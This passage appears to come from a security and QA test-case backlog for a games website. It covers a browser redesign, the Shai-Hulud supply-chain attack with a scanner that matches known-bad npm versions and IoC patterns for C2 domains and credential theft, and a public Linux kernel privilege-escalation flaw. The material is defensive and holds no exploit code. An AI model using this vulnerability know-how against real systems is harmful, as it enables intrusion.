GameZipper CSS to take full control of their visual rendering and avoid browser-design-language drift; subscribe to Microsoft Edge blog for redesign announcements; treat browser UI redesigns as P3 QA events (cosmetic, but visible). Source: https://www.sohu.com/a/1008833159_121956424 (April 13 2026 — "微软Edge 2026大改:界面深度融合Copilot设计"; Edge UI revamp toward Copilot design language; Outlook sidebar removal; Chromium PiP adoption).

---

- [C-143] **[P3]** github.com/Cobenian/shai-hulud-detect (actively maintained June 2026; 222 commits as of search date) documents the open-source community response to the Sep 2025 → June 2026 Shai-Hulud npm/PyPI/Composer/Crates supply-chain attack cluster: a Bash-based scanner that cross-checks the local dependency tree against 3,290+ confirmed-bad package versions AND a library of content-pattern IoCs (Indicators of Compromise) including file hashes, C2 domains, dead-man's-switch artifacts, wipe-threat strings, and AI-assistant-config droppers (the specific payload signatures used by the Shai-Hulud campaign to persist in victim repos). The tool runs per-project or across many projects at once. **Why this is the SHAI-HULUD-DETECT-OPEN-SOURCE-IoC-SCANNER-BASELINE dimension distinct from C-101 (multi-registry CI/CD scanner coverage gap — different layer: scanner architecture/coverage)**: C-101 is the architectural argument that single-registry scanners miss ⅔ of the attack surface; C-143 is the SPECIFIC OPEN-SOURCE TOOL that closes the gap for the Shai-Hulud cluster specifically. **Distinct from C-110 (browser-DevTools-console CVE scanner — different layer: browser, not dependency tree)**: C-110 runs in the browser against the loaded page; C-143 runs against the dependency tree on disk. **Distinct from S-196 (TanStack Mini-Shai-Hulud cache-poisoning attack — different entity: the attack, not the detection tool)**: S-196 documents the attack; C-143 documents the detection tool. **Why this matters for GameZipper**: (a) the GameZipper dependency tree includes npm packages (Phaser, Vite, Tailwind, monetag-manager dependencies) that were in the Shai-Hulud blast radius (per the CN 国家网络与信息安全信息通报中心 advisory on sctv.com — echarts-for-react, @antv series, TanStack series, timeago.js were all compromised); (b) running `shai-hulud-detector.sh` against the GameZipper repo is a TURN-KEY way to verify the dependency tree is clean — no need to write a custom scanner; (c) the 3,290+ bad package versions include specific versions that may have entered the GameZipper tree via Dependabot/Renovate auto-merge; (d) the IoC library (file hashes, C2 domains, dead-man's-switch artifacts) catches even packages that have been REMOVED from npm but are still in `node_modules` / lockfiles; (e) the tool's Bash implementation runs anywhere without a Node/Python dependency — useful for CI/CD pipelines; (f) adopting the tool as a CI gate prevents future Shai-Hulud-style attacks from landing in the GameZipper tree. **Test**: (1) `git clone https://github.com/Cobenian/shai-hulud-detect && cd shai-hulud-detect && chmod +x shai-hulud-detector.sh`; (2) `./shai-hulud-detector.sh /home/msdn/gamezipper.com` — scan the entire GameZipper repo for known-bad package versions and IoC patterns; (3) for any hit, audit the dependency chain — find which package introduced the bad version; (4) verify the hit is not a false positive by cross-referencing the package's npm page and the Cobenian compromised-packages.txt list; (5) integrate `shai-hulud-detector.sh` into the GameZipper pre-commit or pre-deploy hook so every CI run checks the tree; (6) subscribe to the Cobenian repo for IoC updates (the list grows as new Shai-Hulud variants emerge). **Mitigation**: run `shai-hulud-detector.sh` weekly as a scheduled job; integrate into CI as a blocking gate; pin all critical dependencies to known-good versions; subscribe to the Cobenian compromised-packages.txt updates; cross-reference with the CN 国家网络与信息安全信息通报中心 advisory (sctv.com May 25 2026) for the full Shai-Hulud package list; treat ANY hit as P0 — the Shai-Hulud campaign exfiltrates GitHubToken/npmToken/cloud keys/SSH keys/K8s credentials/database connection strings per the CN advisory. Source: https://github.com/Cobenian/shai-hulud-detect (actively maintained June 2026 — 222 commits; 3,290+ compromised package versions; IoC pattern library; per-project and multi-project scanning).

---


## R220 Detailed Test Case Descriptions (v1.101.0 — June 27 2026)

- [S-208] **[P1]** thehackernews.com (June 8 2026 — "One-Character Linux Kernel Flaw Enables Local Root Access, Exploits Now Public") and garrettstimpson.ca (June 23 2026 — "CVE-2026-23111: One Flipped Exclamation Mark Gives You the Linux Kernel") document CVE-2026-23111: a Linux kernel local privilege-escalation vulnerability in the `nf_tables` packet-filtering subsystem (net/netfilter/nf_tables_api.c abort path), patched upstream on February 5 2026. Exodus Intelligence released the full technical walkthrough on June 8 2026, and FuzzingLabs published an independent reproduction around the same time — meaning WORKING PUBLIC EXPLOITS now exist. The root cause is a SINGLE INVERTED CONDITION (one flipped exclamation mark / `!`) in the nf_tables abort path: when a transaction is aborted, the abort handler fails to correctly clean up certain state, leaving a dangling reference that an unprivileged local user can leverage to walk to root. The bug is reachable from any unprivileged user namespace on default-config kernels (`CONFIG_USER_NS=y`, `CONFIG_NF_TABLES=y` — both default-on in Ubuntu/RHEL/Debian).
